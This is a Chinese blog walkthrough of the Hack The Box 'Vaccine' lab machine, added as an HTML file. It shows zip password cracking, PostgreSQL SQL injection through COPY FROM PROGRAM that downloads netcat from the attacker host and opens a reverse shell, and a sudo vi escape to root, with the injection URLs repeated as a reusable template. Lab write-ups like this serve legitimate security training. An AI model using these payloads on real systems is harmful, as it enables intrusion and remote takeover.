@@ -1,0 +1,217 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Hackthebox-Vaccine - F0rmat&#39;Blog</title>
+<link rel="stylesheet" type="text/css" href="/css/main.css">
+</head>
+<body>
+<header>
+  <div>
+    <h1><a href="https://getshe11.com/">F0rmat&#39;Blog</a></h1>
+  </div>
+  <nav></nav>
+</header>
+<main>
+  <article>
+    <div class="title">
+  <h1>Hackthebox-Vaccine</h1>
+  </div>
+<div style="position: fixed; right:-30px; max-width:300px; overflow:auto; top: 1px; width: 300px; bottom:100px">
+<div class="container text-center mt-3">
+    <iframe src="https://duckduckgo.com/search.html?site=https://getshe11.com/&prefill=" style="overflow:hidden;margin:0;padding:0;max-width:80%;height:40px;" frameborder="0"></iframe>
+</div>
+</div>
+<div class="meta">
+  <div>2020-12-05 00:44</div>
+  <div>
+    <span><a href="https://getshe11.com/tags/hackthebox/">#hackthebox</a></span>
+      </div>
+  </div>
+<div class="content">
+  <h1 id="0x01前言">0x01前言</h1>
+<p>hackthebox练习</p>
+<h1 id="0x02-过程">0x02 过程</h1>
+<p>首先直接nmap ：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Vaccine/1.png" alt=""></p>
+<p>发现只有三个端口，根据上一台Oopsie靶机最后给的信息</p>
+<p><strong>ftpuser / mc@F1l3ZilL4</strong></p>
+<p>直接登陆ftp，里面有个备份文件的压缩包：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Vaccine/2.png" alt=""></p>
+<p>但是解压需要密码，可以使用<strong>zip2john</strong>工具，是john包含的一款把zip转换成john能破解的工具：https://github.com/openwall/john</p>
+<p><code>zip2john ~/backup.zip &gt; hash</code></p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Vaccine/3.png" alt=""></p>
+<p>使用john破解：</p>
+<p><code>John hash</code></p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Vaccine/4.png" alt=""></p>
+<p>查看解压的index.php文件：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Vaccine/5.png" alt=""></p>
+<p>从代码逻辑看得出来只要username等于admin且密码等于密码md5加密过后的值，解密2cb42f8734ea607eefed3b70af13bbd3</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Vaccine/6.png" alt=""></p>
+<p>使用该密码登陆80端口的web应用：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Vaccine/7.png" alt=""></p>
+<p>存在sql注入：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Vaccine/8.png" alt=""></p>
+<p>使用sqlmap跑，但是不能执行&ndash;os-shell，官方的可以，可能是网络的问题，进行sql 查询的时候就特别卡</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Vaccine/9.png" alt=""></p>
+<p>网上介绍https://www.aldeid.com/wiki/HackTheBox-StartingPoint-Vaccine</p>
+<p>可以用python脚本<strong>vaccine.py</strong></p>
+<p><a href="https://github.com/florianges/-HTB-Vaccine_sql_injection">https://github.com/florianges/-HTB-Vaccine_sql_injection</a></p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Vaccine/10.png" alt=""></p>
+<p>发现执行不成功，可能还是网络问题，还是乖乖放浏览器执行吧</p>
+<pre><code>http://10.10.10.46/dashboard.php?search=a';DROP TABLE IF EXISTS cmd_31554; -- -
+http://10.10.10.46/dashboard.php?search=a';CREATE TABLE cmd_31554(cmd_output text); -- -
+http://10.10.10.46/dashboard.php?search=a';COPY cmd_31554 FROM PROGRAM 'wget -P /tmp/31554 http://10.10.14.33:80/nc'; -- -
+http://10.10.10.46/dashboard.php?search=a';COPY cmd_31554 FROM PROGRAM 'chmod 777 /tmp/31554/nc'; -- -
+http://10.10.10.46/dashboard.php?search=a';COPY cmd_31554 FROM PROGRAM '/tmp/31554/nc 10.10.14.33 4444 -e /bin/bash'; -- -
+</code></pre><p>反弹成功：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Vaccine/12.png" alt=""></p>
+<p>读取postgres用户的密码：</p>
+<p><code>/var/www/html$ cat dashboard.php</code></p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Vaccine/13.png" alt=""></p>
+<p>看下postgres用户可以执行什么程序：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Vaccine/14.png" alt=""></p>
+<p>编辑pg_hba.conf文件，有一些乱码输入<code>:!/bin/bash</code>即可解决</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Vaccine/15.png" alt=""></p>
+<h1 id="0x03-总结">0x03 总结</h1>
+<p>1、拿到ip直接nmap</p>
+<p>2、看到有需要验证登陆的地方，可以拿其他靶机收集到的账号密码尝试登陆</p>
+<p>3、破解zip：</p>
+<p><code>zip2john xxx.zip &gt; xxx.hash</code></p>
+<p><code>john xxx.hash</code></p>
+<p>4、postgres注入执行命令：</p>
+<ul>
+<li>
+<p><code>http://x.x.x.x/dashboard.php?search=a';DROP TABLE IF EXISTS cmd_31554; -- -</code>  如果存在表则删除</p>
+</li>
+<li>
+<p><code>http://x.x.x.x/dashboard.php?search=a';CREATE TABLE cmd_31554(cmd_output text); -- -</code> 创建数据库表cmd_31554为表名，cmd_output为字段名，text为字段数据类型</p>
+</li>
+<li>
+<p><code>http://x.x.x.x/dashboard.php?search=a';COPY cmd_31554 FROM PROGRAM 'wget -P /tmp/31554 http://x.x.x.x:80/nc'; -- -</code>使用了COPY的语法，官方给的用法解释：</p>
+</li>
+</ul>
+<blockquote>
+<p>COPY moves data between PostgreSQL tables and standard file-system files. COPY TO copies the contents of a table to a file, while COPY FROM copies data from a file to a table (appending the data to whatever is in the table already). COPY TO can also copy the results of a SELECT query.</p>
+</blockquote>
+<p>就是从程序中复制数据到这个字段表里，在这里只是为了执行后面的命令。</p>
+<ul>
+<li><code>http://x.x.x.x/dashboard.php?search=a';COPY cmd_31554 FROM PROGRAM 'chmod 777 /tmp/31554/nc'; -- -</code>执行添加执行权限</li>
+<li><code>http://x.x.x.x/dashboard.php?search=a';COPY cmd_31554 FROM PROGRAM '/tmp/31554/nc 10.10.14.x 4444 -e /bin/bash'; -- -</code></li>
+<li><code>http://x.x.x.x/dashboard.php?search=a';COPY cmd_31554 FROM PROGRAM '/tmp/31554/nc 10.10.14.x 4444 -e /bin/bash'; -- -</code>执行nc反弹shell命令</li>
+</ul>
+<p>5、python建立http服务器</p>
+<ul>
+<li>Python2 <code>python -m SimpleHTTPServer</code></li>
+<li>Python3 <code>python3 -m http.server 80</code></li>
+</ul>
+<p>6、反弹交互式shell</p>
+<pre><code>SHELL=/bin/bash script -q /dev/null # 设置shell为/bin/bash，script 命令可以用作交互终端会话过程的记录，保留用户输入和系统输出的全过程。-q 是静默执行 把会话内容丢到黑洞/dev/null
+Ctrl-Z 后台运行
+stty raw -echo 设置原始输入禁止回显，当您在键盘上输入时，并不出现在屏幕上
+fg 返回前台shell
+reset 跟clear清屏差不多
+xterm 运行标准虚拟终端
+</code></pre><p>7、最后一个步骤为什么可以输入<code>:!/bin/bash</code>直接就跳到root，主要出现在sudo，我们可以看下靶机的<code>/etc/sudoers</code>文件内容：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Vaccine/16.png" alt=""></p>
+<p>只要把用户加到sudoers文件里面就可以拥有root的权限，就好比如我们装ubuntu系统时候初始化是一个user权限，如果想要拥有root权限，必须在sudoers文件里面加入</p>
+<p><code>user ALL=(ALL)    ALL</code></p>
+<p>靶机里面只有用/bin/vi 编辑pg_hba.conf文件的权限，我们可以sudo 输入当前用户密码去编辑文件并在编辑状态下输入<code>:!/bin/bash</code>就能跳转到bash的shell或者输入<code>:!/bin/zsh</code>跳转到zsh的shell</p>
+</div>
+<div style="position: fixed; right:50px; max-width:255px; overflow:auto; top: 120px; width: 220px; bottom:90px">
+
+
+
+
+
+
+
+
+
+
+<div class="toc">
+
+    <div class="page-header"><strong>目录</strong></div>
+
+    <div id="page-scrollspy" class="toc-nav">
+
+        
+        
+            
+                
+                
+                    
+                    <ul class="nav">
+                    
+                    
+                        <li class="nav-item">
+                            <a class="nav-link text-left" href="#0x01%e5%89%8d%e8%a8%80">
+                            0x01前言
+                            </a>
+                        </li>
+                    
+                    
+                    </ul>
+                    
+                
+            
+        
+        
+            
+                
+                
+                    
+                    <ul class="nav">
+                    
+                    
+                        <li class="nav-item">
+                            <a class="nav-link text-left" href="#0x02-%e8%bf%87%e7%a8%8b">
+                            0x02 过程
+                            </a>
+                        </li>
+                    
+                    
+                    </ul>
+                    
+                
+            
+        
+        
+            
+                
+                
+                    
+                    <ul class="nav">
+                    
+                    
+                        <li class="nav-item">
+                            <a class="nav-link text-left" href="#0x03-%e6%80%bb%e7%bb%93">
+                            0x03 总结
+                            </a>
+                        </li>
+                    
+                    
+                    </ul>
+                    
+                
+            
+        
+
+    </div>
+
+</div>
+
+
+
+</div>
+
+  </article>
+</main>
+<footer>
+  <div>
+    <div>&copy; 2021 F0rmat. <a href="https://creativecommons.org/licenses/by/4.0/deed.zh">CC-BY-4.0</a></div>
+  </div>
+</footer>
+</body>
+</html>
